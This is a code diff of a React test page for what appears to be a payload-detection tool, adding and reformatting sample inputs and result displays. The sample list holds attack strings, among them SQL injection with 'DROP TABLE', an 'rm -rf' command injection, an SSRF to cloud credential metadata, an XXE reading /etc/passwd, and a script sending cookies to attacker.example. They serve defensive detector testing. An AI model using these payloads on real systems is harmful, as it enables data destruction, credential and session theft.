@@ -12,7 +12,10 @@ const TestPayload = () => {
   const [error, setError] = useState(null);
 
   const testPayloads = [
-    { name: "Normal - Query", payload: "/api/books?search=harry+potter&page=1" },
+    {
+      name: "Normal - Query",
+      payload: "/api/books?search=harry+potter&page=1",
+    },
     { name: "Normal - Empty", payload: "" },
     { name: "SQL Injection - classic", payload: "' OR '1'='1' --" },
     { name: "SQL Injection - stacked", payload: "1; DROP TABLE users; --" },
@@ -21,14 +24,49 @@ const TestPayload = () => {
       name: "XSS - encoded",
       payload: "%3Cscript%3Ealert('xss')%3C%2Fscript%3E",
     },
-    { name: "Command Injection", payload: "username=admin; rm -rf /tmp/uploads || true" },
+    {
+      name: "Reflected XSS - DOM",
+      payload: "<img src=x onerror=alert(document.cookie) />",
+    },
+    {
+      name: "Command Injection",
+      payload: "username=admin; rm -rf /tmp/uploads || true",
+    },
     { name: "Path Traversal / LFI", payload: "../../../../../etc/passwd" },
     {
       name: "SSRF - metadata access",
-      payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      payload:
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    },
+    {
+      name: "Local File Inclusion (URL param)",
+      payload: "file=/var/www/html/config.php",
+    },
+    { name: "NoSQL Injection (Mongo) ", payload: '{"$ne": null}' },
+    {
+      name: "XML External Entity (XXE)",
+      payload:
+        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+    },
+    {
+      name: "High-entropy / Fuzzed",
+      payload: "dGhpcy1pcy1hLXRlc3QtYmFzZTY0LXN0cmluZzpleGFtcGxl",
+    },
+    {
+      name: "URL with suspicious params",
+      payload: "/redirect?url=http://malicious.example.com",
+    },
+    {
+      name: "Directory Traversal in filename",
+      payload: "image=..%2F..%2F..%2Fsecret%2Ftoken.txt",
     },
     { name: "Server-side template injection", payload: "{{7*7}}" },
-    { name: "NoSQL Injection (Mongo)", payload: '{"$ne": null}' },
+    { name: "HTTP header fuzz", payload: '\'; exec("ls -la") // ' },
+    {
+      name: "Cookie exfil attempt",
+      payload:
+        "<script>fetch('https://attacker.example/?c='+document.cookie)</script>",
+    },
     {
       name: "Mixed vector (SQLi + XSS)",
       payload: "search=<script>document.cookie</script>&id=123 OR 1=1 --",
@@ -92,11 +130,15 @@ const TestPayload = () => {
           <form onSubmit={handleSubmit} className="space-y-4">
             {/* IP Input */}
             <div>
-              <label className="block text-sm font-medium text-gray-300 mb-2">IP Address</label>
+              <label className="block text-sm font-medium text-gray-300 mb-2">
+                IP Address
+              </label>
               <input
                 type="text"
                 value={formData.ip}
-                onChange={(e) => setFormData({ ...formData, ip: e.target.value })}
+                onChange={(e) =>
+                  setFormData({ ...formData, ip: e.target.value })
+                }
                 className="w-full px-4 py-2 bg-gray-900 border border-gray-600 text-gray-200 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-transparent transition-all"
                 required
               />
@@ -104,10 +146,14 @@ const TestPayload = () => {
 
             {/* Payload Input */}
             <div>
-              <label className="block text-sm font-medium text-gray-300 mb-2">Payload</label>
+              <label className="block text-sm font-medium text-gray-300 mb-2">
+                Payload
+              </label>
               <textarea
                 value={formData.payload}
-                onChange={(e) => setFormData({ ...formData, payload: e.target.value })}
+                onChange={(e) =>
+                  setFormData({ ...formData, payload: e.target.value })
+                }
                 className="w-full px-4 py-2 bg-gray-900 border border-gray-600 text-gray-200 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-transparent h-32 font-mono text-sm"
                 placeholder="Enter payload to test..."
                 required
@@ -139,7 +185,9 @@ const TestPayload = () => {
                   <span className="font-medium text-gray-300 group-hover:text-primary-400">
                     {test.name}
                   </span>
-                  <p className="text-xs text-gray-500 font-mono truncate mt-1">{test.payload}</p>
+                  <p className="text-xs text-gray-500 font-mono truncate mt-1">
+                    {test.payload}
+                  </p>
                 </button>
               ))}
             </div>
@@ -209,7 +257,9 @@ const TestPayload = () => {
                     key={model}
                     className="flex justify-between items-center bg-gray-800/40 px-3 py-2 rounded-lg"
                   >
-                    <span className="text-sm text-gray-300 capitalize">{model}</span>
+                    <span className="text-sm text-gray-300 capitalize">
+                      {model}
+                    </span>
                     <span
                       className={`text-sm font-semibold ${
                         score > 0.7
@@ -234,7 +284,9 @@ const TestPayload = () => {
                   <div className="grid grid-cols-2 gap-4 text-sm">
                     <div>
                       <p className="text-gray-400">Entropy:</p>
-                      <p className="text-primary-400 font-semibold">{result.features.entropy}</p>
+                      <p className="text-primary-400 font-semibold">
+                        {result.features.entropy}
+                      </p>
                     </div>
                     <div>
                       <p className="text-gray-400">Reputation Score:</p>
@@ -259,7 +311,9 @@ const TestPayload = () => {
                   {/* Tokens */}
                   {result.features.tokens && (
                     <div>
-                      <p className="text-gray-400 mt-2 mb-1">Extracted Tokens:</p>
+                      <p className="text-gray-400 mt-2 mb-1">
+                        Extracted Tokens:
+                      </p>
                       <div className="flex flex-wrap gap-2">
                         {result.features.tokens.map((t, i) => (
                           <span
